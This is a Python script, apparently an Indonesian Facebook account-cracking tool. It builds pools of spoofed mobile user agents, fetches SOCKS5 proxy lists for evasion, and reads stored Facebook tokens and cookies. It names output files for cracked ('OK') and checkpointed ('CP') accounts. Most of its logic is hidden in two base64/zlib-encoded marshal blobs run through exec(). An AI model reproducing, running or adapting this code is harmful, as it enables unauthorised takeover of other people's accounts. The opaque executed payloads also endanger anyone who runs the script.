#!/usr/bin/python
# coding=utf-8

##########################################
#       DIBUAT OLEH JECKO RAMADHAN       #
#   TEAM XNXCODE, XTCCODE, SYBER SNIPER  #
# RISKY, AANG XD, YUMASA, SHOLEH, FIRMAN #
# XENZI X, YUMEE ID, NOPAL XD, NAZRI XD  #
##########################################

##########################################
#          !!! PERINGATAN !!!            #
#   JANGAN SALAH GUNAKAN TOOLS SEBAGAI   #
# TEMPAT HAL BURUK GUNAKAN DENGAN BIJAK  #
#  HINDARI DARI PENIPUAN ATAS TIRUAN SC  #
##########################################

# <========== IMPORT MODULE PYTHON
import requests,bs4,json,os,sys,random,datetime,time,re,marshal
import urllib3,rich,base64
from rich.table import Table as me # <========== IMPORT MODULE RICH
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel
from rich import print as nanoGg
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from rich.progress import Progress
from rich.progress import BarColumn
from rich.progress import TextColumn
from rich.progress import SpinnerColumn
from rich.progress import TimeElapsedColumn
from colorama import Fore, Back, Style # <========== IMPORT COLOR
# <========== PENGGANTI WARNA
Q = Fore.BLUE # <========== WARNA BIRU
J= Fore.LIGHTBLUE_EX # <========== WARNA BIRU
P = Fore.WHITE # <========== WARNA PUTIH
U = Fore.CYAN # <========== WARNA BIRUMUDA
I = Fore.GREEN # <========== WARNA IJO
H = Fore.GREEN # <========== WARNA IJO
N = Fore.GREEN # <========== WARNA IJO
K = Fore.YELLOW # <========== WARNA KUNING
M = Fore.RED # <========== WARNA MERAH
O = Fore.MAGENTA # <========== WARNA PINK
B = Fore.CYAN # <========== WARNA BIRU
W = random.choice([U,Q,J,O,M]) # <========== RANDOM WARNA
aing = "100032577396395" # <========== ID AUTHOR
basic = "mbasic.facebook.com" # <========== URL MBASIC
pepek = "m.facebook.com" # <========== URL M
kentu = "free.facebook.com" # <========== URL FREE
mobil = "mobile.facebook.com" # <========== URL MOBILE
dev = "developer.facebook.com" # <========== DEVELOPER FACEBOOK
maling_pangsit ="{P}[{K}•{P}] " # <========== TAMPIL MALING
m_fb = 'm.facebook.com' # <========== URL M
url_businness = "https://business.facebook.com" # <========== BUSINNES
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36" # <========== UA 
web_fb = "https://www.facebook.com/" # <========== FACEBOOK
m_feb = "https://m.facebook.com/" # <========== M
mbasic = 'mbasic.facebook.com' # <========== MBASIC
free_fb = 'free.facebook.com' # <========== FREE
iphone = 'IPhone.facebook.com' # <========== IPON
b_api = 'bapi.facebook.com' # <========== B API
touch = 'touch.facebook.com' # <========== TOUCH
x_fb = 'x.facebook.com' # <========== X FACEBOOK
graph = 'graph.facebook.com' # <========== GRAPH
d_fb = 'd.facebook.com' # <========== D
head_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"} # <========== UA
mbasic="https://mbasic.facebook.com{}" # <========== MBASIC
done=0 # <========== PENAMPUNKAN
die=0
id = []
id2 = []
loop = 0
ok = 0
cp = 0
tokenku = []
uid = []
akun = []
ganti = []
method = []
cokbrut = []
pwpluss = []
data,data2 = {},{}
pwnya = []
cari = []
ses=requests.Session()
ses = requests.Session()
cokbrut=[]
pwpluss,pwnya=[],[]
# <========== WAKTU
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
memek = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
pentil = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
__join__ = ''+str(tgl)+' '+str(bln)+' '+str(thn)+''
def waktu(): # <========== WAKTU SIANG MALAM PAGI SORE
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "good morning" # <========== SELAMAT PAGI
	elif 12 <= hours < 15:timenow = "good afternoon" # <========== SELAMAT SIANG
	elif 15 <= hours < 18:timenow = "good evening" # <========== SELAMAT SORE
	else:timenow = "good night" # <========== SELAMAT MALAM
	return timenow
reset = "[/]"
IP = requests.get("http://ip-api.com/json/").json()["query"]
negara = requests.get("http://ip-api.com/json/").json()["country"]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('proxy.txt','w').write(prox)
except Exception as e:
	print(f"\n{P}[{K}•{P}] {M}Tools bersifat berbahaya maka gunakan dengan bijak :V")
bahasa = random.choice(['en-gb,en;q=0.7,es;q=0.3','en-US,en;q=0.5','fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5','da, en-gb;q=0.8, en;q=0.7','zh, en-us; q=0.8, en; q=0.6','en-US,en;q=0.9','pl_PL;q=0.8, en_US;q=0.2'])
gent = random.choice(['NokiaC2-00/2.0 (03.82) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; id; NokiaC2-00) U2/1.0.0 UCBrowser/9.5.0.449 U2/1.0.0','Mozilla/5.0 (Series40; NokiaC2-03/07.63; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.7.0.0.11','BlackBerry9360/8.0.0.388 Profile/MIDP-2.0 Configuration/CLDC-1.1/UC Browser7.8.0.95/160/352','Mozilla/5.0 (BlackBerry; U; BlackBerry 9380; id) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.746 Mobile Safari/534.11+','Mozilla/5.0 (Linux; Android 11; vivo 1904; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.1.0.2','Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-A800F Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Mobile Safari/537.36','Mozilla/5.0 (Linux; Tizen 2.3; SAMSUNG SM-Z130H) AppleWebKit/537.3 (KHTML, like Gecko) SamsungBrowser/1.0 Mobile Safari/537.3','Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 Instagram 244.1.0.19.110 Android (22/5.1.1; 320dpi; 720x1280; OPPO; A37f; A37f; qcom; en_GB; 384108438)','Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 Instagram 146.0.0.27.125 Android (22/5.1.1; 320dpi; 720x1280; OPPO; A37f; A37f; qcom; in_ID; 221134009)','Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S7230E/S723EXXJJ1; U; Bada/1.0; fr-fr) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/2.0 Mobile WQVGA SMM-MMS/1.2.0 OPN-B','Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S5250/S525WXEKE1; U; Bada/1.0; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/2.0 Mobile WQVGA SMM-MMS/1.2.0 NexPlayer/3.0 profile/MIDP-2.1 configuration/CLDC-1.1 OPN-B','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.1.17 (KHTML, like Gecko) Version/7.1 Safari/537.85.10','Mozilla/5.0 (BlackBerry; U; BlackBerry 9890; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/8.0.0.261 Mobile Safari/534.11+'])
lite = random.choice(["Mozilla/5.0 (Linux; Android 6.0.1; vivo 1606 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/310.0.0.12.108;]","Mozilla/5.0 (Linux; Android 12; M2101K6G Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/367.0.0.9.112;]","Mozilla/5.0 (Linux; Android 12; V2032 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/310.0.0.12.108;]","Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 202.0.0.23.119 (iPhone11,8; iOS 14_7_1; en_US; en-US; scale=2.00; 828x1792; 312612729)","Mozilla/5.0 (Linux; Android 12; M2101K7BG Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/309.0.0.16.114;]"])
for x in range(1000):
	rr = random.randint
	rc = random.choice
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP"
	if ugent1 in cari:pass
	else:
		cari.append(ugent1)
	ugent2 = f"Mozilla/5.0 (Linux; U; Android {str(rr(8,10))}; en-US; Redmi Note {str(rr(5,8))} Build/PKQ1.{str(rr(111111,199999))}.00{str(rr(1,9))} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.{str(rr(1111,6666))}.2 UCBrowser/13.4.0.{str(rr(1111,6666))} Mobile Safari/537.36"
	if ugent2 in cari:pass
	else:
		cari.append(ugent2)
	ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; en-US; SM-{str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Mobile UCBrowser/3.4.3.{str(rr(111,999))}"
	if ugent3 in cari:pass
	else:
		cari.append(ugent3)
def jalan(_____JEECK_X_NANO_______KANG_____COLI____BABI___): # <========== BUAT TEXT BERJALAN :V
	for _______MALING____PANGSIT_____MALING____AYAM_____MALING___ROKOK_____MALING____KOPI_____MALING____ in _____JEECK_X_NANO_______KANG_____COLI____BABI___ + "\n":
		sys.stdout.write(_______MALING____PANGSIT_____MALING____AYAM_____MALING___ROKOK_____MALING____KOPI_____MALING____)
		sys.stdout.flush()
		time.sleep(0.03)
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "good morning"
	elif 12 <= hours < 15:timenow = "good afternoon"
	elif 15 <= hours < 18:timenow = "good evening"
	else:timenow = "good night"
	return timenow
def logo(): # <========== LOGO BUAT TAMPILAN JMBFF GTG
	os.system("clear")
	WARNA_TOD = random.choice([W,K,I,U])
	print(f"""
{WARNA_TOD}______________  _____________________________
{WARNA_TOD}______  /__   |/  /__  __ )__  ____/__  ____/   {J}•{U}--------------------------{J}•
{WARNA_TOD}___ _  /__  /|_/ /__  __  |_  /_   __  /_       {J}•{N}     MADE IN INDONESIA    {J}•
{WARNA_TOD}/ /_/ / _  /  / / _  /_/ /_  __/   _  __/       {J}•{N}   JEECK X NANO AND RISKY {J}•
{WARNA_TOD}\____/  /_/  /_/  /_____/ /_/      /_/          {J}•{U}--------------------------{J}•          """) # <========== JANGAN DI UBAH ANJINK
def log_log(): #<========= LOGO BUAT LOGIN BABI
	os.system("clear")
	os.system("xdg-open https://facebook.com/jecko.ramadhan.9")
	WARNA_TOD = random.choice([W,K,I,U])
	print(f"""
{WARNA_TOD}______ ___________________________   __________________
{WARNA_TOD}___  / __  __ \_  ____/___  _/__  | / /__  ____/__  __ \ {U}• {W}JEECK X NANO {U}•
{WARNA_TOD}__  /  _  / / /  / __  __  / __   |/ /__  /_   __  __  |
{WARNA_TOD}_  /___/ /_/ // /_/ / __/ /  _  /|  / _  __/   _  /_/ /
{WARNA_TOD}/_____/\____/ \____/  /___/  /_/ |_/  /_/      /_____/
""") #<========= LOGIN LOGO

_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));exec((_)(b'==AAQAAAAIwcAAAAB4TZsVHZv1GPIotP4xzA6DAAAIgcAAAACIHAp+VAaPWZ4VGBaLQKOl1dBFUQBFUQBFUQBFUQBFUQBFUQBFUQDFUQBFUUBFUQBhUTNFUQBFkWBJ0aBlVUBd1ZCtWQs1UQLFlTqFUQBFUQBFUQBFUQBFUQBF0QnFUQBFUWBFUQCRUQBFUQjhzbBFUQCZjRIFVQaFkRrF0bNN0bBdEaBhEMBRWQCtWQyE1Qnd3SnFUYFFkZRZ0aCh0dCFWUGlTQsNWQid2YCFUQFFUQRJEMB9WTBFUUCpVQHFlRmFlTrJkbwUUZqR3aCNDMGpVQot2QXF1SaFEdrRkS3VkZRpFMBNzdFd2dGVUQGBTcmFFZ4I0VR5kT3JUOChVUFF2ZWtGRudHRtdnQrR0M3FUb3NEZCh0dHZWQKtWRJBDRhdmW5MESRh0bBhGODtURCZWUstWRYdXSkdmQ5VFSRp0Z3FkQBhUR1RWQxd2QyE1UvFVRCFESRN0Z3FkQBhUR1Z1dCtWQG1UQBFVQCFUQFFEZB1GRBFURBdVUCtWQG1UQLJlTPV2ZsBjYyQHbilWNwUGSUFWQYpkND1mT2JmM0BnWTVDMlhEVhJUbOZnYyQHcahFcIFGSSBzYI1kNMlXOzQ2MjVnWtZkaadlS2JmMzVXWykDdMpXR31ERBpXTqV1MOpXT14kaNVjTTlzdiNjTwMWe4EjT61EMORVWy4kaNNjTUFUeORUS2BlMGd3YEFTbZ1mewF0dBFUQPtWQBFUQBVGaK52YtZ0dhNUNtl1VOxWWtljdhlXNqJmMxYzQXFDalNUMoplMVlTTI92QQpnQ2EWRxYXZtx2cidUR250U0cXSDhWWNRVR3kUR4BnYuZFNJh0Z04Eb4IjTDt2ZRhlQ3J2RWhlWXpEThhVU25EVNNDTq1kMJNEaMNlRS5EVDd3ZidEbyp1UChkWX5kcil3anFlMolnYyEDbMp3a0wkaBVnTENWMPNENy4UaCRVWXpFaj12a25EVNNDTq1kMLFlUhN0VGFDZHhmdj1GbwUGWv5UWyYkahdUV0llM5UHZIpkdih0bRNmMWpGTX50bMhlVox0VxYXWtx2cah1bLRGWOx2YpFDaaJjV1R2TrJUQBFUQllWNvRGSSd3Y69mdMJDZ5lFWC9GTtpFaZJjVpJmM5IHTt5kdiNVOy0EVNVXTDlDdaNVOtp1VWtGUygHci12c5UGav12YIZVaidEb6F2RWtGUUFUbZdlTqpFWOpHWzIldhJjV1B1UrN0VnR2badlRrpFWKp3VnRmaiJTOyF2VWpnMnpEcah0bmlESKRXSDFTealmQwImM0xmYpVDMlhUUnpUaZdWWykjdhJDbsxkbSRDZDtWTycmU2N2RWVnMnJVeadlRrJzZSxWZHxGMycmV5l1V14mWW9GRjJjV6JzZSdnYz4EMycmUwoFWoBzVnJVcjJTO1JzZWNnYyY0ajlzbFJ2VWVHZk92QiNDUhJkbOVzYzIFbiN1aLJzZWBjYyQHbix2bEllM5I3YnVUQBFkQhFkMstGZO9mRidEb0FGWUFWQXdTYC1Gasl1VSx2Y09mQlhUSLFUQBFkMnJ1aZhlUoFXUClnRnFUQBB1bEBFSntiMnRGdadVNxg1MO9WQnFUQBhUTxFUQBFUQnV0TBFFNCRUQFdUQRdmQCFURFFUUJJkQBV0TBF1dCNUQFVWQR9mQDFURJFkUJNkQ2t2RDF0dCNGanFUQBJ0TLFlR5dUQBFUQIl0VBFUQBNGaZFUQBJUeGdWQBFESJhVQBFUQyc2Z4I2V5sGZXhHbQdWRBFUQCpXQnFUQBF0dCBAAFgycCkCATFAZAEQADGwgAQWAlBQZAAAAQMHAAAAQAAAADAAAAAAAAAAAAAAAAAAAAAwY'))
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==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'))
#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'))
def menu(): #<====== MAIN TO MENU
	try:
		_kontol_ = open("token.txt","r").read()
		_colmek_ = open("cookie.txt","r").read()
		_memek_ = {"cookie":_colmek_}
		data = ses.get(f"https://graph.facebook.com/me?fields=name,id,birthday &access_token={_kontol_}",cookies=_memek_).json()
		___nano___name___ = data["name"] #<========= TAMPIL NAMA
		___nano___userid___ = data["id"] #<========= TAMPIL ID
		___nano___ttl___ = data["birthday"] #<========= TAMPIL TTL
		___nano___IP___ = requests.get("http://ip-api.com/json/").json()["query"] #<========= TAMPIL IP
		___nano___negara___ = requests.get("http://ip-api.com/json/").json()["country"] #<========= TAMPIL NEGARA
	except (FileNotFoundError,KeyError,IOError):
		print(f"\n{P}[{K}•{P}]{M} Kemungkinan akun anda mati ya anjink");login()
	os.system('clear')
	logo()
	print(f"""
{P}[{W}•{P}]
{W} |
{W} |___{P}Username       : {U}{___nano___name___}
